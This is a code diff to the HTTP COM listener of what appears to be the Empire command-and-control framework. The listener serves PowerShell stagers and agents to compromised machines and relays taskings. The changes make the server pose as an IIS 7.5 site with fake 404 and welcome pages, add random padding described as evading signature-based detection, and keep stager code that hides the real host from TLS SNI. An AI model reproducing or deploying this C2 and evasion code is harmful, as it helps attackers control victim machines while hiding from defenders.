@@ -5,9 +5,10 @@ import os
 import ssl
 import time
 import copy
+import json
 import sys
 from pydispatch import dispatcher
-from flask import Flask, request, make_response
+from flask import Flask, request, make_response, send_from_directory
 
 # Empire imports
 from lib.common import helpers
@@ -137,17 +138,86 @@ class Listener:
         # set the default staging key to the controller db default
         self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])
 
+        # randomize the length of the default_response and index_page headers to evade signature based scans
+        self.header_offset = random.randint(0,64)
 
     def default_response(self):
+         """
+         Returns an IIS 7.5 404 not found page.
+         """
+
+         return '\n'.join([
+             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+             '<html xmlns="http://www.w3.org/1999/xhtml">',
+             '<head>',
+             '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
+             '<title>404 - File or directory not found.</title>',
+             '<style type="text/css">',
+             '<!--',
+             'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
+             'fieldset{padding:0 15px 10px 15px;}',
+             'h1{font-size:2.4em;margin:0;color:#FFF;}',
+             'h2{font-size:1.7em;margin:0;color:#CC0000;}',
+             'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}',
+             '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
+             'background-color:#555555;}',
+             '#content{margin:0 0 0 2%;position:relative;}',
+             '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
+             '-->',
+             '</style>',
+             '</head>',
+             '<body>',
+             '<div id="header"><h1>Server Error</h1></div>',
+             '<div id="content">',
+             ' <div class="content-container"><fieldset>',
+             '  <h2>404 - File or directory not found.</h2>',
+             '  <h3>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</h3>',
+             ' </fieldset></div>',
+             '</div>',
+             '</body>',
+             '</html>',
+             ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
+         ])
+
+    def index_page(self):
         """
         Returns a default HTTP server page.
         """
-        page = "<html><body><h1>It works!</h1>"
-        page += "<p>This is the default web page for this server.</p>"
-        page += "<p>The web server software is running but no content has been added, yet.</p>"
-        page += "</body></html>"
-        return page
 
+        return '\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />',
+            '<title>IIS7</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body {',
+            '    color:#000000;',
+            '    background-color:#B3B3B3;',
+            '    margin:0;',
+            '}',
+            '',
+            '#container {',
+            '    margin-left:auto;',
+            '    margin-right:auto;',
+            '    text-align:center;',
+            '    }',
+            '',
+            'a img {',
+            '    border:none;',
+            '}',
+            '',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="container">',
+            '<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="welcome.png" alt="IIS7" width="571" height="411" /></a>',
+            '</div>',
+            '</body>',
+            '</html>',
+        ])
 
     def validate_options(self):
         """
@@ -234,7 +304,7 @@ class Listener:
                         if "https" in host:
                             host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                         else:
-                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port) 
+                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)
 
                 # code to turn the key string into a byte array
                 stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
@@ -259,7 +329,7 @@ class Listener:
                     for header in customHeaders:
                         headerKey = header.split(':')[0]
                         headerValue = header.split(':')[1]
-                        
+
                         if headerKey.lower() == "host":
                             modifyHost = True
 
@@ -270,7 +340,7 @@ class Listener:
                 #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
                 if modifyHost:
                     stager += helpers.randomize_capitalization("$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};")
-                
+
                 stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
                 stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
                 stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
@@ -311,7 +381,7 @@ class Listener:
         host = listenerOptions['Host']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
         customHeaders = profile.split('|')[2:]
-        
+
         # select some random URIs for staging from the main profile
         stage1 = random.choice(uris)
         stage2 = random.choice(uris)
@@ -438,7 +508,7 @@ class Listener:
 
         if language:
             if language.lower() == 'powershell':
-                
+
                 updateServers = """
                     $Script:ControlServers = @("%s");
                     $Script:ServerIndex = 0;
@@ -453,9 +523,9 @@ class Listener:
                     }
 
                 """ % (listenerOptions['Host']['Value'])
-                
+
                 getTask = """
-                    function script:Get-Task {
+                    $script:GetTask = {
                         try {
                             if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
 
@@ -489,7 +559,7 @@ class Listener:
                 """ % (listenerOptions['RequestHeader']['Value'])
 
                 sendMessage = """
-                    function script:Send-Message {
+                    $script:SendMessage = {
                         param($Packets)
 
                         if($Packets) {
@@ -507,7 +577,7 @@ class Listener:
                                 $Headers = ""
                                 $script:Headers.GetEnumerator()| %{ $Headers += "`r`n$($_.Name): $($_.Value)" }
                                 $Headers.TrimStart("`r`n")
-                                
+
                                 try {
                                     # choose a random valid URI for checkin
                                     $taskURI = $script:TaskURIs | Get-Random
@@ -562,8 +632,14 @@ class Listener:
             Before every request, check if the IP address is allowed.
             """
             if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
-                dispatcher.send("[!] %s on the blacklist/not on the whitelist requested resource" % (request.remote_addr), sender="listeners/http_com")
-                return make_response(self.default_response(), 200)
+                listenerName = self.options['Name']['Value']
+                message = "[!] {} on the blacklist/not on the whitelist requested resource".format(request.remote_addr)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
+                return make_response(self.default_response(), 404)
 
 
         @app.after_request
@@ -581,6 +657,24 @@ class Listener:
             response.headers['Expires'] = "0"
             return response
 
+        @app.route('/')
+        @app.route('/index.html')
+        def serve_index():
+            """
+            Return default server web page if user navigates to index.
+            """
+
+            static_dir = self.mainMenu.installPath + "data/misc/"
+            return make_response(self.index_page(), 200)
+
+        @app.route('/welcome.png')
+        def serve_index_helper():
+            """
+            Serves image loaded by index page.
+            """
+
+            static_dir = self.mainMenu.installPath + "data/misc/"
+            return send_from_directory(static_dir, 'welcome.png')
 
         @app.route('/<path:request_uri>', methods=['GET'])
         def handle_get(request_uri):
@@ -590,9 +684,16 @@ class Listener:
             This is used during the first step of the staging process,
             and when the agent requests taskings.
             """
-
             clientIP = request.remote_addr
-            dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/http_com')
+
+            listenerName = self.options['Name']['Value']
+            message = "[*] GET request for {}/{} from {}".format(request.host, request_uri, clientIP)
+            signal = json.dumps({
+                'print': True,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
+
             routingPacket = None
             reqHeader = request.headers.get(listenerOptions['RequestHeader']['Value'])
             if reqHeader and reqHeader != '':
@@ -612,33 +713,57 @@ class Listener:
                                 # handle_agent_data() signals that the listener should return the stager.ps1 code
 
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
-                                dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http_com')
+                                listenerName = self.options['Name']['Value']
+                                message = "[*] Sending {} stager (stage 1) to {}".format(language, clientIP)
+                                signal = json.dumps({
+                                    'print': True,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                                 stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                                 return make_response(base64.b64encode(stage), 200)
 
                             elif results.startswith('ERROR:'):
-                                dispatcher.send("[!] Error from agents.handle_agent_data() for %s from %s: %s" % (request_uri, clientIP, results), sender='listeners/http_com')
+                                listenerName = self.options['Name']['Value']
+                                message = "[!] Error from agents.handle_agent_data() for {} from {}: {}".format(request_uri, clientIP, results)
+                                signal = json.dumps({
+                                    'print': True,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
 
                                 if 'not in cache' in results:
                                     # signal the client to restage
                                     print helpers.color("[*] Orphaned agent from %s, signaling retaging" % (clientIP))
                                     return make_response(self.default_response(), 401)
                                 else:
-                                    return make_response(self.default_response(), 200)
+                                    return make_response(self.default_response(), 404)
 
                             else:
                                 # actual taskings
-                                dispatcher.send("[*] Agent from %s retrieved taskings" % (clientIP), sender='listeners/http_com')
+                                listenerName = self.options['Name']['Value']
+                                message = "[*] Agent from {} retrieved taskings".format(clientIP)
+                                signal = json.dumps({
+                                    'print': True,
+                                    'message': message
+                                })
+                                dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                                 return make_response(base64.b64encode(results), 200)
                         else:
                             # dispatcher.send("[!] Results are None...", sender='listeners/http_com')
-                            return make_response(self.default_response(), 200)
+                            return make_response(self.default_response(), 404)
                 else:
-                    return make_response(self.default_response(), 200)
+                    return make_response(self.default_response(), 404)
 
             else:
-                dispatcher.send("[!] %s requested by %s with no routing packet." % (request_uri, clientIP), sender='listeners/http_com')
-                return make_response(self.default_response(), 200)
+                listenerName = self.options['Name']['Value']
+                message = "[!] {} requested by {} with no routing packet.".format(request_uri, clientIP)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
+                return make_response(self.default_response(), 404)
 
 
         @app.route('/<path:request_uri>', methods=['POST'])
@@ -665,7 +790,14 @@ class Listener:
                             # TODO: document the exact results structure returned
                             sessionID = results.split(' ')[1].strip()
                             sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
-                            dispatcher.send("[*] Sending agent (stage 2) to %s at %s" % (sessionID, clientIP), sender='listeners/http_com')
+
+                            listenerName = self.options['Name']['Value']
+                            message = "[*] Sending agent (stage 2) to {} at {}".format(sessionID, clientIP)
+                            signal = json.dumps({
+                                'print': True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
 
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                             agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
@@ -675,17 +807,29 @@ class Listener:
                             return make_response(base64.b64encode(encrypted_agent), 200)
 
                         elif results[:10].lower().startswith('error') or results[:10].lower().startswith('exception'):
-                            dispatcher.send("[!] Error returned for results by %s : %s" %(clientIP, results), sender='listeners/http_com')
+                            listenerName = self.options['Name']['Value']
+                            message = "[!] Error returned for results by {} : {}".format(clientIP, results)
+                            signal = json.dumps({
+                                'print': True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                             return make_response(self.default_response(), 200)
                         elif results == 'VALID':
-                            dispatcher.send("[*] Valid results return by %s" % (clientIP), sender='listeners/http_com')
+                            listenerName = self.options['Name']['Value']
+                            message = "[*] Valid results return by {}".format(clientIP)
+                            signal = json.dumps({
+                                'print': True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
                             return make_response(self.default_response(), 200)
                         else:
                             return make_response(base64.b64encode(results), 200)
                     else:
-                        return make_response(self.default_response(), 200)
+                        return make_response(self.default_response(), 404)
             else:
-                return make_response(self.default_response(), 200)
+                return make_response(self.default_response(), 404)
 
         try:
             certPath = listenerOptions['CertPath']['Value']
@@ -709,8 +853,14 @@ class Listener:
                 app.run(host=bindIP, port=int(port), threaded=True)
 
         except Exception as e:
-            print helpers.color("[!] Listener startup on port %s failed: %s " % (port, e))
-            dispatcher.send("[!] Listener startup on port %s failed: %s " % (port, e), sender='listeners/http_com')
+            listenerName = self.options['Name']['Value']
+            message = "[!] Listener startup on port {} failed: {}".format(port, e)
+            message += "\n[!] Ensure the folder specified in CertPath exists and contains your pem and private key file."
+            signal = json.dumps({
+                'print': True,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/http_com/{}".format(listenerName))
 
 
     def start(self, name=''):
